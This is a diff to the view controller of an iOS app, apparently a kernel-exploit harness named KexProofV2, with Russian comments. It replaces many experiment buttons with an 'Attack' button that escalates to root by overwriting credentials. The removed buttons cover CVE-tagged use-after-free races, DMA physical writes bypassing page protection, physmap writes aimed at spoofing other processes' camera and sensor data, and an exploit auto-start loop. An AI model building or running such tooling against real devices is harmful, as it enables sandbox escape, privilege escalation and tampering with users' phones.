@@ -9,6 +9,7 @@
 @interface KPViewController ()
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, strong) UIButton *exploitButton;
+@property (nonatomic, strong) UIButton *attackButton;
 @property (nonatomic, strong) UIButton *dumpButton;
 @property (nonatomic, strong) UIButton *sptmButton;
 @property (nonatomic, strong) UIButton *sptmTableButton;
@@ -71,62 +72,11 @@
                                     color:[UIColor colorWithRed:0.20 green:0.55 blue:0.35 alpha:1.0]];
     [self.exploitButton addTarget:self action:@selector(exploitTapped) forControlEvents:UIControlEventTouchUpInside];
 
-    // 1.5.9: the dump is a separate button. The exploit's win stays banked in
-    // this process (hasKRW), and the dump writes incrementally — a panic in a
-    // late section no longer costs a re-race of the probabilistic exploit.
-    self.dumpButton = [self makeButton:@"Дамп структур (после УСПЕШЕН)"
-                                 color:[UIColor colorWithRed:0.30 green:0.45 blue:0.60 alpha:1.0]];
-    [self.dumpButton addTarget:self action:@selector(dumpTapped) forControlEvents:UIControlEventTouchUpInside];
+    // kexproofv2 2.0.42: ровно две кнопки — Эксплойт и Атака. Всё лишнее убрано.
+    self.attackButton = [self makeButton:@"Атака (f_cred → root)"
+                                   color:[UIColor colorWithRed:0.65 green:0.20 blue:0.20 alpha:1.0]];
+    [self.attackButton addTarget:self action:@selector(attackTapped) forControlEvents:UIControlEventTouchUpInside];
 
-    // Physmap write user test: пишется ли userland-страница через physmap
-    // kernel VA — ключ к подмене данных процессов (камера/сенсоры/Ghost).
-    self.physmapButton = [self makeButton:@"Physmap write user page test"
-                                    color:[UIColor colorWithRed:0.25 green:0.55 blue:0.45 alpha:1.0]];
-    [self.physmapButton addTarget:self action:@selector(physmapTapped) forControlEvents:UIControlEventTouchUpInside];
-
-    self.geoButton = [self makeButton:@"Reachability matrix (какие сервисы открыты)"
-                                color:[UIColor colorWithRed:0.20 green:0.50 blue:0.62 alpha:1.0]];
-    [self.geoButton addTarget:self action:@selector(geoTapped) forControlEvents:UIControlEventTouchUpInside];
-
-    self.gartButton = [self makeButton:@"GART recon (IOGPU, read-only)"
-                                 color:[UIColor colorWithRed:0.35 green:0.45 blue:0.30 alpha:1.0]];
-    [self.gartButton addTarget:self action:@selector(gartTapped) forControlEvents:UIControlEventTouchUpInside];
-
-    self.m2uafButton = [self makeButton:@"NECP UAF (flow dangling)"
-                                  color:[UIColor colorWithRed:0.65 green:0.18 blue:0.18 alpha:1.0]];
-    [self.m2uafButton addTarget:self action:@selector(m2uafTapped) forControlEvents:UIControlEventTouchUpInside];
-
-    // CVE-2026-43655 teardown race: calibration-first (фаза A kread-only),
-    // затем close victim'а ПОД параллельным submitter'ом. ДЕСТРУКТИВНО.
-    self.m2tButton = [self makeButton:@"M2 teardown UAF (CVE-2026-43655)"
-                                color:[UIColor colorWithRed:0.58 green:0.30 blue:0.10 alpha:1.0]];
-    [self.m2tButton addTarget:self action:@selector(m2tTapped) forControlEvents:UIControlEventTouchUpInside];
-
-    // CVE-2026-20687: startDecoder UAF, victim→reclaim→trigger. Паника (MTE
-    // tag fault) = подтверждение. Reachability 1.9.92: драйвер ОТКРЫТ.
-    self.jpegButton = [self makeButton:@"JPEG startDecoder UAF (CVE-2026-20687)"
-                                 color:[UIColor colorWithRed:0.50 green:0.16 blue:0.34 alpha:1.0]];
-    [self.jpegButton addTarget:self action:@selector(jpegTapped) forControlEvents:UIControlEventTouchUpInside];
-
-    // Итерация 3: управляемый OOB-read (credit=индекс), НЕ краш. По панике
-    // 045942: discovery scheduler'а → свип смещений, валидация против kread.
-    self.m2oButton = [self makeButton:@"M2 oracle (OOB-read, без паники)"
-                                color:[UIColor colorWithRed:0.16 green:0.45 blue:0.55 alpha:1.0]];
-    [self.m2oButton addTarget:self action:@selector(m2oTapped) forControlEvents:UIControlEventTouchUpInside];
-
-    // DMA physwrite через подмену backing PA поверхности (DART мимо SPTM):
-    // контрольная страница → маркер; дальше защищённая страница (proc_ro).
-    self.dmaButton = [self makeButton:@"DMA physwrite (IOSurface PA swap)"
-                                color:[UIColor colorWithRed:0.55 green:0.45 blue:0.12 alpha:1.0]];
-    [self.dmaButton addTarget:self action:@selector(dmaTapped) forControlEvents:UIControlEventTouchUpInside];
-
-    self.shareButton = [self makeButton:@"Поделиться отчётом"
-                                  color:[UIColor colorWithRed:0.25 green:0.35 blue:0.60 alpha:1.0]];
-    [self.shareButton addTarget:self action:@selector(shareTapped) forControlEvents:UIControlEventTouchUpInside];
-    // Always tappable: it shares the report if present AND the live log, so a
-    // panic before any dump still leaves something to send back.
-    self.shareButton.enabled = YES;
-    self.shareButton.alpha = 1.0;
 
     [self updateExperimentButtons];
 
@@ -135,16 +85,7 @@
     [self.view addSubview:self.statusLabel];
     [self.view addSubview:self.logView];
     [self.view addSubview:self.exploitButton];
-    [self.view addSubview:self.dumpButton];
-    [self.view addSubview:self.physmapButton];
-    [self.view addSubview:self.geoButton];
-    [self.view addSubview:self.gartButton];
-    [self.view addSubview:self.m2uafButton];
-    [self.view addSubview:self.m2tButton];
-    [self.view addSubview:self.jpegButton];
-    [self.view addSubview:self.m2oButton];
-    [self.view addSubview:self.dmaButton];
-    [self.view addSubview:self.shareButton];
+    [self.view addSubview:self.attackButton];
 
     UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
     [NSLayoutConstraint activateConstraints:@[
@@ -168,57 +109,12 @@
         [self.exploitButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
         [self.exploitButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
         [self.exploitButton.heightAnchor constraintEqualToConstant:46],
-        [self.exploitButton.bottomAnchor constraintEqualToAnchor:self.dumpButton.topAnchor constant:-8],
+        [self.exploitButton.bottomAnchor constraintEqualToAnchor:self.attackButton.topAnchor constant:-8],
 
-        [self.dumpButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.dumpButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.dumpButton.heightAnchor constraintEqualToConstant:38],
-        [self.dumpButton.bottomAnchor constraintEqualToAnchor:self.physmapButton.topAnchor constant:-7],
-
-        [self.physmapButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.physmapButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.physmapButton.heightAnchor constraintEqualToConstant:38],
-        [self.physmapButton.bottomAnchor constraintEqualToAnchor:self.geoButton.topAnchor constant:-7],
-
-        [self.geoButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.geoButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.geoButton.heightAnchor constraintEqualToConstant:38],
-        [self.geoButton.bottomAnchor constraintEqualToAnchor:self.gartButton.topAnchor constant:-7],
-
-        [self.gartButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.gartButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.gartButton.heightAnchor constraintEqualToConstant:38],
-        [self.gartButton.bottomAnchor constraintEqualToAnchor:self.m2uafButton.topAnchor constant:-7],
-
-        [self.m2uafButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.m2uafButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.m2uafButton.heightAnchor constraintEqualToConstant:38],
-        [self.m2uafButton.bottomAnchor constraintEqualToAnchor:self.m2tButton.topAnchor constant:-7],
-
-        [self.m2tButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.m2tButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.m2tButton.heightAnchor constraintEqualToConstant:38],
-        [self.m2tButton.bottomAnchor constraintEqualToAnchor:self.jpegButton.topAnchor constant:-7],
-
-        [self.jpegButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.jpegButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.jpegButton.heightAnchor constraintEqualToConstant:38],
-        [self.jpegButton.bottomAnchor constraintEqualToAnchor:self.m2oButton.topAnchor constant:-7],
-
-        [self.m2oButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.m2oButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.m2oButton.heightAnchor constraintEqualToConstant:38],
-        [self.m2oButton.bottomAnchor constraintEqualToAnchor:self.dmaButton.topAnchor constant:-7],
-
-        [self.dmaButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.dmaButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.dmaButton.heightAnchor constraintEqualToConstant:38],
-        [self.dmaButton.bottomAnchor constraintEqualToAnchor:self.shareButton.topAnchor constant:-8],
-
-        [self.shareButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
-        [self.shareButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
-        [self.shareButton.heightAnchor constraintEqualToConstant:40],
-        [self.shareButton.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-10],
+        [self.attackButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
+        [self.attackButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
+        [self.attackButton.heightAnchor constraintEqualToConstant:46],
+        [self.attackButton.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-10],
     ]];
 
     __weak typeof(self) weakSelf = self;
@@ -230,38 +126,7 @@
         [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [NSDate date]];
     [[KPLog shared] append:@"KexProofV2 загружен. Эксплойт работает в обычной песочнице приложения, без джейлбрейк-энтитлментов."];
 
-    // 1.9.91: auto-fire the exploit 1.5s after launch — after a panic-reboot
-    // the whole ritual is: open the app, put the phone down, wait.
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)),
-                   dispatch_get_main_queue(), ^{
-        if (!self.jobRunning && !KPRunner.hasKRW) {
-            // kexproofv2 2.0.2: страж мёртвого прогона. Флаг ставится при старте
-            // эксплойта и снимается только при дописанном отчёте/успехе. Есть
-            // флаг = прошлый прогон умер (ребут/паника) → НЕ автостартим:
-            // сначала «Поделиться», иначе новый прогон опять собьёт логи.
-            NSString *crashFlag = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-crash.flag"];
-            if ([[NSFileManager defaultManager] fileExistsAtPath:crashFlag]) {
-                [[KPLog shared] append:@"[auto] ⚠ прошлый прогон не дописан (флаг kexproof-crash.flag) — сначала прожми «Поделиться отчётом», потом «Эксплойт» вручную. Автостарт пропущен."];
-                return;
-            }
-            // 1.9.267: страж того же бута — повторный прогон на загрязнённом
-            // драйвере обречён (258/259 и 262c/264 — одинаковый slide в обоих
-            // парах). kern.boottime в NSUserDefaults живёт между запусками и
-            // умирает с ребутом: совпал = тот же бут → автостарт пропускаем.
-            struct timeval bt = {0}; size_t bsz = sizeof(bt);
-            long curBoot = 0;
-            if (sysctlbyname("kern.boottime", &bt, &bsz, NULL, 0) == 0) curBoot = bt.tv_sec;
-            NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
-            long lastBoot = [ud integerForKey:@"kexLastBoot"];
-            if (curBoot && curBoot == lastBoot) {
-                [[KPLog shared] append:@"[auto] ⚠ ТОТ ЖЕ БУТ (boottime совпал) — драйвер загрязнён прошлым прогоном. РЕБУТНИ и запусти снова. Автостарт пропущен."];
-                return;
-            }
-            if (curBoot) [ud setInteger:curBoot forKey:@"kexLastBoot"];
-            [[KPLog shared] append:@"[auto] запускаю эксплойт сам (автостарт)"];
-            [self exploitTapped];
-        }
-    });
+    // kexproofv2 2.0.42: автозапуск эксплойта отключён — только по кнопке.
 }
 
 - (UILabel *)makeLabel:(CGFloat)size weight:(UIFontWeight)weight color:(UIColor *)color {
@@ -458,6 +323,23 @@
             [self.exploitButton setTitle:@"Повторить эксплойт" forState:UIControlStateNormal];
         }
     }];
+}
+
+- (void)attackTapped {
+    if (!KPRunner.hasKRW || ![self beginJob]) return;
+    self.statusLabel.text = @"Атака (f_cred → root)…";
+    [[KPLog shared] append:@"[RESULT] АТАКА: запуск"];
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        NSString *report = [KPDump fgAttackReport];
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [[KPLog shared] append:report];
+            BOOL win = [report containsString:@"ROOT-FS WIN"] || [report containsString:@"ROOT (filesystem) WIN"];
+            [[KPLog shared] appendFormat:win ? @"[RESULT] АТАКА: УСПЕШЕН ★★" : @"[RESULT] АТАКА: FAIL — см. [FGATTACK] строки выше"];
+            self.statusLabel.text = win ? @"АТАКА УСПЕШНА — root (filesystem)" : @"Атака не прошла — см. лог";
+            self.jobRunning = NO;
+            [self updateExperimentButtons];
+        });
+    });
 }
 
 - (void)dumpTapped {
